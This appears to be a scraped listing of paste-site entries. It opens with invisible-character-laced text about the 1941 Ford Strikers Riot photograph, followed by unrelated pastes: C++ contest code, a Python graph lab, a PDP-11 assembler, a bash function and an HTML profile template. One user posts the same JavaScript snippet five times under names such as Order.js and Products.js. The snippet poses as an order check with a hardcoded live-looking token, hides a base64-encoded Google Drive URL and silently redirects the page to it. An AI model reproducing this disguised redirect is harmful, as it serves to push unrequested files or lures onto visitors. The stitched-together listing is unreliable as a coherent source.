F‎o‎r‎d‎ ‎S‎t‎r‎i‎k‎e‎r‎s‎ ‎R‎i‎o‎t‎ ‎i‎s‎ ‎a‎ ‎1‎9‎4‎1‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎t‎h‎a‎t‎ ‎s‎h‎o‎w‎s‎ ‎a‎n‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎s‎t‎r‎i‎k‎e‎b‎r‎e‎a‎k‎e‎r‎ ‎g‎e‎t‎t‎i‎n‎g‎ ‎b‎e‎a‎t‎e‎n‎ ‎b‎y‎ ‎U‎n‎i‎t‎e‎d‎ ‎A‎u‎t‎o‎ ‎W‎o‎r‎k‎e‎r‎s‎ ‎(‎U‎A‎W‎)‎ ‎s‎t‎r‎i‎k‎e‎r‎s‎ ‎w‎h‎o‎ ‎w‎e‎r‎e‎ ‎p‎i‎c‎k‎e‎t‎i‎n‎g‎ ‎a‎t‎ ‎t‎h‎e‎ ‎F‎o‎r‎d‎ ‎M‎o‎t‎o‎r‎ ‎C‎o‎m‎p‎a‎n‎y‎'‎s‎ ‎R‎o‎u‎g‎e‎ ‎P‎l‎a‎n‎t‎ ‎i‎n‎ ‎D‎e‎a‎r‎b‎o‎r‎n‎,‎ ‎M‎i‎c‎h‎i‎g‎a‎n‎.‎ ‎M‎i‎l‎t‎o‎n‎ ‎B‎r‎o‎o‎k‎s‎,‎ ‎a‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎r‎ ‎f‎o‎r‎ ‎T‎h‎e‎ ‎D‎e‎t‎r‎o‎i‎t‎ ‎N‎e‎w‎s‎,‎ ‎c‎a‎p‎t‎u‎r‎e‎d‎ ‎t‎h‎e‎ ‎i‎m‎a‎g‎e‎ ‎o‎n‎ ‎A‎p‎r‎i‎l‎ ‎3‎,‎ ‎1‎9‎4‎1‎,‎ ‎a‎n‎d‎ ‎i‎t‎ ‎w‎o‎n‎ ‎t‎h‎e‎ ‎i‎n‎a‎u‎g‎u‎r‎a‎l‎ ‎P‎u‎l‎i‎t‎z‎e‎r‎ ‎P‎r‎i‎z‎e‎ ‎f‎o‎r‎ ‎P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎y‎ ‎i‎n‎ ‎1‎9‎4‎2‎.‎ ‎T‎h‎e‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎h‎a‎s‎ ‎b‎e‎e‎n‎ ‎c‎a‎l‎l‎e‎d‎ ‎a‎ ‎p‎o‎r‎t‎r‎a‎y‎a‎l‎ ‎o‎f‎ ‎t‎h‎e‎ ‎s‎t‎r‎u‎g‎g‎l‎e‎ ‎i‎n‎ ‎A‎m‎e‎r‎i‎c‎a‎ ‎b‎e‎t‎w‎e‎e‎n‎ ‎c‎a‎p‎i‎t‎a‎l‎ ‎a‎n‎d‎ ‎l‎a‎b‎o‎r‎.‎ ‎D‎u‎r‎i‎n‎g‎ ‎t‎h‎e‎ ‎i‎n‎c‎i‎d‎e‎n‎t‎,‎ ‎a‎ ‎p‎e‎a‎c‎e‎f‎u‎l‎ ‎p‎i‎c‎k‎e‎t‎i‎n‎g‎ ‎o‎f‎ ‎t‎h‎e‎ ‎F‎o‎r‎d‎ ‎M‎o‎t‎o‎r‎ ‎C‎o‎m‎p‎a‎n‎y‎ ‎w‎a‎s‎ ‎i‎n‎t‎e‎r‎r‎u‎p‎t‎e‎d‎ ‎w‎h‎e‎n‎ ‎a‎ ‎s‎i‎n‎g‎l‎e‎ ‎m‎a‎n‎ ‎c‎l‎a‎s‎h‎e‎d‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎ ‎U‎A‎W‎ ‎s‎t‎r‎i‎k‎e‎r‎s‎.‎ ‎T‎h‎e‎ ‎m‎a‎n‎ ‎i‎g‎n‎o‎r‎e‎d‎ ‎t‎h‎e‎ ‎a‎d‎v‎i‎c‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎M‎i‎c‎h‎i‎g‎a‎n‎ ‎S‎t‎a‎t‎e‎ ‎P‎o‎l‎i‎c‎e‎ ‎a‎n‎d‎ ‎c‎r‎o‎s‎s‎e‎d‎ ‎t‎h‎e‎ ‎p‎i‎c‎k‎e‎t‎ ‎l‎i‎n‎e‎s‎.‎ ‎B‎r‎o‎o‎k‎s‎,‎ ‎w‎h‎o‎ ‎w‎a‎s‎ ‎w‎a‎i‎t‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎o‎t‎h‎e‎r‎ ‎p‎h‎o‎t‎o‎j‎o‎u‎r‎n‎a‎l‎i‎s‎t‎s‎ ‎o‎u‎t‎s‎i‎d‎e‎ ‎t‎h‎e‎ ‎F‎o‎r‎d‎ ‎f‎a‎c‎t‎o‎r‎y‎ ‎g‎a‎t‎e‎s‎,‎ ‎t‎o‎o‎k‎ ‎o‎n‎l‎y‎ ‎o‎n‎e‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎a‎n‎d‎ ‎s‎a‎i‎d‎:‎ ‎""‎I‎ ‎t‎o‎o‎k‎ ‎t‎h‎e‎ ‎p‎i‎c‎t‎u‎r‎e‎ ‎q‎u‎i‎c‎k‎l‎y‎,‎ ‎h‎i‎d‎ ‎t‎h‎e‎ ‎c‎a‎m‎e‎r‎a‎ ‎.‎.‎.‎ ‎d‎u‎c‎k‎e‎d‎ ‎i‎n‎t‎o‎ ‎t‎h‎e‎ ‎c‎r‎o‎w‎d‎ ‎.‎.‎.‎ ‎a‎ ‎l‎o‎t‎ ‎o‎f‎ ‎p‎e‎o‎p‎l‎e‎ ‎w‎o‎u‎l‎d‎ ‎h‎a‎v‎e‎ ‎l‎i‎k‎e‎d‎ ‎t‎o‎ ‎w‎r‎e‎c‎k‎ ‎t‎h‎a‎t‎ ‎p‎i‎c‎t‎u‎r‎e‎.‎""‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎M‎i‎l‎t‎o‎n‎ ‎B‎r‎o‎o‎k‎s‎;‎ ‎r‎e‎s‎t‎o‎r‎e‎d‎ ‎b‎y‎ ‎Y‎a‎n‎n‎ ‎F‎o‎r‎g‎e‎t‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

W‎e‎l‎l‎,‎ ‎g‎a‎n‎g‎,‎ ‎f‎a‎r‎e‎w‎e‎l‎l‎.‎ ‎A‎n‎d‎ ‎a‎s‎ ‎I‎ ‎a‎l‎w‎a‎y‎s‎ ‎s‎a‎y‎,‎ ‎L‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎E‎R‎O‎O‎O‎O‎O‎I‎E‎E‎E‎E‎H‎ ‎J‎E‎E‎N‎N‎K‎I‎I‎I‎I‎I‎I‎I‎I‎I‎I‎I‎I‎I‎N‎S‎S‎S‎S‎S‎S‎!‎"
hweUP1AQ,Untitled,kammex,JavaScript,Thursday 3rd of April 2025 03:30:21 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/953/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mriujVJa,传送阵 参考代码,Dmaxiya,C++,Thursday 3rd of April 2025 03:00:09 PM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 1000000 + 100;
int n, ans;
int a[maxn], fa[maxn], cnt[maxn];

void init() {
    for (int i = 1; i <= n; ++i) {
        fa[i] = i;
        cnt[i] = 1;
    }
}

int findF(int x) {
    return fa[x] == x ? x : fa[x] = findF(fa[x]);
}

void union_(int x, int y) {
    x = findF(x);
    y = findF(y);
    if (x != y) {
        fa[x] = y;
        cnt[y] += cnt[x];
    }
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    cin >> n;
    init();
    for (int i = 1; i <= n; ++i) {
        cin >> a[i];
        union_(i, a[i]);
    }
    for (int i = 1; i < n; ++i) {
        ans = max(ans, cnt[findF(i)]);
        if (findF(i) != findF(i + 1)) {
            ans = max(ans, cnt[findF(i)] + cnt[findF(i + 1)]);
        }
    }
    cout << ans << endl;

    return 0;
}
"
3tFaJjeA,Order.js,kammex,JavaScript,Thursday 3rd of April 2025 02:59:38 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/876/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ExLtjenZ,Dumps,LVL23HT,CSS,Thursday 3rd of April 2025 02:55:24 PM CDT,hy whats tools use hackers
8H67sPuk,Market.js,kammex,JavaScript,Thursday 3rd of April 2025 02:44:16 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/261/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
u3Prs6Fe,SAKOD_lab5.py,Solingen,Python,Thursday 3rd of April 2025 02:31:43 PM CDT,"#!/usr/bin/env python3
# \author: Артюхин Матфей
# \date_start: 2025-03-29
# \date_end: 2025-04-3

class Graph:
    """"""
    \brief Класс для представления графа и работы с матрицами смежности и инцидентности.

    \param vertices [in] - список названий вершин
    \param edges [in]    - словарь ребер вида {название: (вершина1, вершина2, вес)}
    """"""
    def __init__(self):
        self.vertices = []
        self.edges = {}

    def add_vertex(self, name):
        """"""
        \brief Добавление вершины в граф.

        \param name [in] - название вершины
        """"""
        if name in self.vertices:
            print(f""Ошибка: вершина '{name}' уже существует!"")
            return
        self.vertices.append(name)

    def add_edge(self, name, v1, v2, weight):
        """"""
        \brief Добавление ребра в граф.

        \param name [in]   - название ребра
        \param v1 [in]    - первая вершина
        \param v2 [in]    - вторая вершина
        \param weight [in] - вес ребра
        """"""
        if name in self.edges:
            print(f""Ошибка: ребро '{name}' уже существует!"")
            return
        if v1 not in self.vertices or v2 not in self.vertices:
            print(""Ошибка: указанная вершина не существует!"")
            return
        self.edges[name] = (v1, v2, weight)

    def adjacency_matrix(self):
        """"""
        \brief Построение матрицы смежности.

        \retval list - матрица смежности с весами
        """"""
        size = len(self.vertices)
        matrix = [[0] * size for _ in range(size)]
        idx = {v: i for i, v in enumerate(self.vertices)}
        
        for edge in self.edges.values():
            i = idx[edge[0]]
            j = idx[edge[1]]
            matrix[i][j] = edge[2]
            matrix[j][i] = edge[2]  # для ненаправленного графа
        return matrix

    def incidence_matrix(self):
        """"""
        \brief Построение матрицы инцидентности.

        \retval list - матрица инцидентности с весами
        """"""
        size_v = len(self.vertices)
        size_e = len(self.edges)
        matrix = [[0] * size_e for _ in range(size_v)]
        idx_v = {v: i for i, v in enumerate(self.vertices)}
        idx_e = {e: i for i, e in enumerate(self.edges)}
        
        for i, (edge_name, edge_data) in enumerate(self.edges.items()):
            v1, v2, weight = edge_data
            matrix[idx_v[v1]][i] = weight
            matrix[idx_v[v2]][i] = weight
        return matrix

    def print_matrix(self, matrix, title, row_labels, col_labels):
        """"""
        \brief Форматированный вывод матрицы.

        \param matrix [in]     - матрица для вывода
        \param title [in]      - заголовок
        \param row_labels [in] - метки строк
        \param col_labels [in] - метки столбцов
        \retval None
        """"""
        print(f""\n{title}:"")
        # Шапка с названиями ребер/вершин
        header = ""\t"" + ""\t"".join(col_labels)
        print(header)
        # Тело матрицы
        for i, row in enumerate(matrix):
            line = f""{row_labels[i]}\t"" + ""\t"".join(map(str, row))
            print(line)

def main():
    """"""
    \brief Основная функция для ввода данных и вывода результатов.
    """"""
    graph = Graph()

    # Ввод вершин
    n_vertices = int(input(""Количество вершин: ""))
    for _ in range(n_vertices):
        name = input(""Название вершины: "").strip()
        graph.add_vertex(name)

    # Ввод ребер
    n_edges = int(input(""Количество ребер: ""))
    for _ in range(n_edges):
        name = input(""Название ребра: "").strip()
        v1 = input(""Первая вершина: "").strip()
        v2 = input(""Вторая вершина: "").strip()
        weight = float(input(""Вес ребра: ""))
        graph.add_edge(name, v1, v2, weight)

    # Построение и вывод матриц
    adj_matrix = graph.adjacency_matrix()
    inc_matrix = graph.incidence_matrix()

    graph.print_matrix(
        adj_matrix,
        ""Матрица смежности"",
        graph.vertices,
        graph.vertices
    )

    graph.print_matrix(
        inc_matrix,
        ""Матрица инцидентности"",
        graph.vertices,
        list(graph.edges.keys())
    )

if __name__ == ""__main__"":
    main()"
wCbJ3x9L,Quotes/Information,NeedToSchool1,Python,Thursday 3rd of April 2025 02:25:34 PM CDT,"""Less than 5% of the information/intelligence in the world is publicly available.""

""Most of the information/intelligence in the world is hidden by a scary, dark, powerful force that controls everything, and it won't show its face."""
2Q2NXJ33,Products.js,kammex,JavaScript,Thursday 3rd of April 2025 02:13:16 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/989/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kcciQhuE,拼正方形 参考代码,Dmaxiya,C++,Thursday 3rd of April 2025 02:12:39 PM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;

LL sq(LL x) {
    LL high = 1000000000;
    LL low = 1;
    LL mid;
    while (high - low > 1) {
        mid = (high + low) >> 1;
        if (mid * mid <= x) {
            low = mid;
        } else {
            high = mid;
        }
    }
    return low;
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    LL x = sq(7385137888721LL * 4 + 10470245);
    cout << x << endl;
    cout << (5435122LL / 2 * (5435122LL / 2) <= 7385137888721LL) << endl;
    cout << (x * x - 5435122LL * 5435122LL <= 10470245) << endl;
    cout << 5435122 << endl;

    return 0;
}
"
qnVqUbZT,my_code_3,Korotkodul,Python,Thursday 3rd of April 2025 01:48:24 PM CDT,"import pyparsing as pp
import re
import struct
from typing import List, Dict, Union

debug_mode = True

class PDP11Assembler:
    def __init__(self):
        # Инициализация парсера pyparsing (как в вашем коде)
        self.command_name = pp.Optional(pp.Suppress(' ')) + pp.Word(pp.alphas)
        self.argument_name = pp.Optional(pp.Suppress(' ')) + pp.Word(pp.printables, exclude_chars=';,')
        self.arguments = pp.Optional(pp.Suppress(' ')) + pp.Optional(self.argument_name) + pp.ZeroOrMore(pp.Suppress(',') + self.argument_name)
        self.label = pp.Combine(pp.Optional(pp.Suppress(' ')) + pp.Word(pp.alphanums) + pp.Optional(pp.Suppress(' ')) + pp.Literal(':'))
        self.comment = pp.Optional(pp.Suppress(' ')) + pp.Suppress(';') + pp.Optional(pp.Suppress(' ')) + pp.restOfLine()
        self.rule = pp.Optional(self.label) + pp.Optional(self.command_name) + pp.Optional(
            self.arguments) + pp.Optional(self.comment)

        # Таблица команд (расширенная версия)
        self.command_table = {
            'halt': {'opcode': 0o000000, 'args': [], 'handler': self._handle_no_args},
            'mov': {'opcode': 0o010000, 'args': ['ss', 'dd'], 'handler': self._handle_ss_dd},
            'add': {'opcode': 0o060000, 'args': ['ss', 'dd'], 'handler': self._handle_ss_dd},
            'sub': {'opcode': 0o160000, 'args': ['ss', 'dd'], 'handler': self._handle_ss_dd},
            'cmp': {'opcode': 0o020000, 'args': ['ss', 'dd'], 'handler': self._handle_ss_dd},
            'br': {'opcode': 0o000400, 'args': ['xx'], 'handler': self._handle_branch},
            'bne': {'opcode': 0o001000, 'args': ['xx'], 'handler': self._handle_branch},
        }

        self.labels = {}
        self.current_address = 0o1000
        self.output_blocks = []

    def parse_line(self, line: str) -> List[str]:
        """"""Аналог вашей функции parse с улучшениями""""""
        #if debug_mode:
        #    print(""line:"", line)
        line = line.strip()
        if not line:
            return []

        if line.startswith('.'):
            if line.startswith('.='):
                return ['origin', line[2:].strip()]
            return []

        try:
            return self.rule.parseString(line).asList()
        except pp.ParseException:
            return []

    def _handle_no_args(self, cmd: Dict, args: List[str], words: List[Union[int, str]]):
        """"""Обработка команд без аргументов""""""
        words.append(cmd['opcode'])

    def _handle_branch(self, cmd: Dict, args: List[str], words: List[Union[int, str]]):
        """"""Обработка команд ветвления""""""
        words.append(cmd['opcode'])
        words.append(args[0])  # Сохраняем метку для разрешения позже

    def _handle_ss_dd(self, cmd: Dict, args: List[str], words: List[Union[int, str]]):
        """"""Обработка двухоперандных команд""""""
        src = self._parse_operand(args[0])
        dst = self._parse_operand(args[1])

        instruction = cmd['opcode'] | (src['mode'] << 6) | (src['reg'] << 3) | dst['mode'] | dst['reg']
        words.append(instruction)

        if src['mode'] == 0o27:  # Немедленная адресация
            words.append(src['value'])

    def _parse_operand(self, op: str) -> Dict[str, Union[int, str]]:
        """"""Улучшенный парсер операндов""""""
        if not op:
            return {'mode': 0, 'reg': 0, 'value': 0}

        # Регистровая адресация (R0-R7)
        if re.match(r'^[rR][0-7]$', op):
            return {'mode': 0, 'reg': int(op[1]), 'value': 0}

        # Немедленная адресация (#n)
        if op.startswith('#'):
            return {'mode': 0o27, 'reg': 0, 'value': int(op[1:])}

        return {'mode': 0, 'reg': 0, 'value': 0}

    def cmd_to_raw_machine_code(self, parsed: List[str]) -> List[Union[int, str]]:
        """"""Аналог вашей функции, но с улучшенной структурой""""""
        if not parsed:
            return []

        """"""if isinstance(parsed[0], list) and len(parsed[0]) == 2 and parsed[0][1] == ':':
            # Обработка метки
            label = parsed[0][0]
            self.labels[label] = self.current_address
            parsed = parsed[1:]

        if not parsed:
            return []""""""

        if parsed[0] == 'origin':
            self.current_address = int(parsed[1], 8)
            return []

        cmd_name = parsed[0].lower()
        if cmd_name not in self.command_table:
            return []

        cmd = self.command_table[cmd_name]
        args = parsed[1:]

        if len(args) != len(cmd['args']):
            return []

        words = []
        cmd['handler'](cmd, args, words)
        return words


    def recycle_lines(self, lines: List[str]):
        """"""Второй проход: генерация машинного кода""""""
        self.current_address = 0o1000
        current_block = {'start': 0o1000, 'data': []}

        if debug_mode:
            print()
            print(""recycle_lines"")
            print()

        for line in lines:

            if debug_mode:
                print(""line:"", line)

            parsed = self.parse_line(line)

            if debug_mode:
                print(""parsed:"", parsed)

            if not parsed:
                continue

            if parsed[0] == 'origin':
                if current_block['data']:
                    self.output_blocks.append(current_block)
                addr = int(parsed[1], 8)
                current_block = {'start': addr, 'data': []}
                self.current_address = addr
                continue

            """"""if isinstance(parsed[0], list) and len(parsed[0]) == 2 and parsed[0][1] == ':':
                parsed = parsed[1:]
                if not parsed:
                    continue""""""

            words = self.cmd_to_raw_machine_code(parsed)
            for item in words:
                if isinstance(item, str):  # Метка для ветвления
                    offset = (self.labels[item] - self.current_address - 2) // 2
                    current_block['data'][-1] |= (offset & 0o377)
                else:
                    current_block['data'].append(item)
                    self.current_address += 2

        if current_block['data']:
            self.output_blocks.append(current_block)

    def write_s_record_format(self, filename: str):
        """"""Запись результата в требуемом формате""""""
        if not self.output_blocks:
            return

        block = self.output_blocks[0]
        data_bytes = bytearray()

        for word in block['data']:
            # Правильный порядок байтов (как в вашем примере)
            data_bytes.append(word & 0xFF)
            data_bytes.append((word >> 8) & 0xFF)

        with open(filename, 'w') as f:
            # Первая строка: адрес и размер
            f.write(f""0200 {len(data_bytes):04x}\n"")

            # Байты машинного кода
            for byte in data_bytes:
                f.write(f""{byte:02x}\n"")

    def assemble(self, input_filename: str, output_filename: str):
        """"""Основной метод ассемблирования""""""
        with open(input_filename, 'r') as f:
            lines = f.readlines()

        self.recycle_lines(lines)

        # Запись результата
        self.write_s_record_format(output_filename)



assembler = PDP11Assembler()

test_code = """"""
    .=1000
    mov #2, r0
    mov #3, r1
    add r0, r1
    halt
""""""

with open(""test.asm"", ""w"") as f:
    f.write(test_code)

assembler.assemble(""asm_code.txt"", ""output.txt"")
print(""Ассемблирование завершено. Результат в output.txt"")"
4HPedEHs,multiple_cd.sh,FranzVuttke,Bash,Thursday 3rd of April 2025 01:16:04 PM CDT,".. () {
	if [[ -z $1 ]]; then
		cd ..
	else
		x=$1
		until [[ $x==0 ]]
		do
			cd..
			let x-=1
		done
	fi
}"
5YxUuQG4,Products.js,kammex,JavaScript,Thursday 3rd of April 2025 01:11:45 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/372/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
6KtGzi7C,trailblazers page code,kanapuro,HTML,Thursday 3rd of April 2025 01:08:43 PM CDT,"<!-- ------------------------------
 
 
        HEAVY — Custom Colours version.
        (code by jiko)
        
        
        RULES
        → Read this thoroughly please, and maybe drop a small comment saying that you've read it? :'3
        thank youu [ https://toyhou.se/~bulletins/127417.code-rules ]
        
        → turn OFF WYSIWYG
        → turn ON Code Editor
        
        
        TIPPY TIPS
        → insert your img links INSIDE or quotation marks!!
        → for the stats, change the number in [ width:50% ] to your desired percentage [ 0% to 100% ]
        
        
        ACCENT : #ffffff
        → use ctrl + f in the editor to easily replace all!
 
 
 ------------------------------- -->
 <div class=""row no-gutters mx-auto text-justify"" style=""font-size:90%; max-width:1000px"">
 <!-- ------------------------------
 
 
            HEADER
            → can actually be name, lyric or quote!
            → the icon could represent your character's clan!
 

 ------------------------------- --> 
 <div class=""col-lg-12 p-1"">
 <div class=""bg-faded justify-content-between text-uppercase text-right p-3"" style=""font-size:150%; letter-spacing:0.2em;"">
    
    <i class=""fas fa-cat fa-fw my-auto""></i>
    Trailblazers - NAME

 </div>
 </div> 
 <!-- ------------------------------
 
 
            FIRST SECTION
            → sidebar
 

 ------------------------------- --> 
 <div class=""col-lg-4 p-1"">
 <div class=""bg-faded p-3 px-4 h-100"">
    
    
    <!-- ------------------------------------
                 AVATAR
    ------------------------------------- -->
    <!--
    → i'd recommand a square image — 200x200 is best!
    → paste [fr-rounded] in the img class if you want a circle icon!
    -->
    <div class=""text-center"">
        
        <img src=""https://upload.wikimedia.org/wikipedia/commons/thumb/2/27/Square_200x200.svg/1200px-Square_200x200.svg.png""
        class=""img-thumbnail rounded-0 p-2 my-2 mx-auto"" style=""height: 200px; width: 200px;"">
        
    </div>
    
    
    
    <!-- ------------------------------------
                 BASIC INFO
    ------------------------------------- -->
    <div class=""row no-gutters mt-4"">
        
        
        <div class=""col-lg-12 justify-content-between"">
            <span class=""text-uppercase text-muted"">Names</span>
            <span class=""text-right"">TEXT HERE</span>
        </div><hr class=""mt-2 mb-4 w-100"">
        
        
        <div class=""col-lg-12 justify-content-between"">
            <span class=""text-uppercase text-muted"">Nicknames</span>
            <span class=""text-right"">
                TEXT HERE<br>
            </span>
        </div><hr class=""mt-2 mb-4 w-100"">
        
        
        <div class=""col-lg-12 justify-content-between"">
            <span class=""text-uppercase text-muted"">Pronouns</span>
            <span class=""text-right"">TEXT HERE</span>
        </div><hr class=""mt-2 mb-4 w-100"">
        
        
        <div class=""col-lg-12 justify-content-between"">
            <span class=""text-uppercase text-muted"">Attraction</span>
            <span class=""text-right"">TEXT HERE</span>
        </div><hr class=""mt-2 mb-4 w-100"">
        
        
        <div class=""col-lg-12 justify-content-between"">
            <span class=""text-uppercase text-muted"">Allegiances</span>
            <span class=""text-right"">TEXT HERE</span>
        </div><hr class=""mt-2 mb-4 w-100"">
        
        
        <div class=""col-lg-12 justify-content-between"">
            <span class=""text-uppercase text-muted"">Birthdate</span>
            <span class=""text-right"">TEXT HERE</span>
        </div><hr class=""mt-2 mb-4 w-100"">
        
        
        <div class=""col-lg-12 justify-content-between"">
            <span class=""text-uppercase text-muted"">Relevance</span>
            <span class=""text-right"">TEXT HERE</span>
        </div><hr class=""mt-2 mb-4 w-100"">
        
        
        <div class=""col-lg-12 justify-content-between"">
            <span class=""text-uppercase text-muted"">Abilities</span>
          <span class=""text-right"">TEXT HERE</span>
        </div><hr class=""mt-2 mb-4 w-100"">
        
        
    </div>
 </div>
 </div>
 <!-- ------------------------------
 
 
            SECOND SECTION
            → profile content
 

 ------------------------------- --> 
 <div class=""col-lg-8 p-1"">
 <!--
 don't want the scrolling feature?
 delete [style=""height: 710px; overflow:auto""] below!
 -->
<div class=""card rounded-0 border-0 p-3"" style=""height: 710px; overflow:auto"">
    
    
          <img src=""https://s3-alpha.figma.com/hub/file/6308025122/83d719d3-68c3-4747-871d-34a6efcd926e-cover.png"">

        
    <!-- ------------------------------------
                 PERSONALITY
    ------------------------------------- -->
    <div class=""mb-3"">
        
        <!-- ------ HEADER ------------------------------ -->
        <div class=""p-1 text-uppercase"" style=""font-size:120%; letter-spacing:2px"">
            
            <i class=""far fa-heart fa-fw"" style=""color:#ffffff""></i>
            Personality
            
        </div>
        <hr class=""my-1 mb-2 w-100"">
        
        
        <!-- ------ CONTENT ------------------------------ -->
        <div class=""ml-lg-4 text-muted"">
            
              <b>Personality Traits</b>
              <p>TEXT HERE</p>
              
              <b>Motives & Methods</b>
              <p>TEXT HERE</p>
              
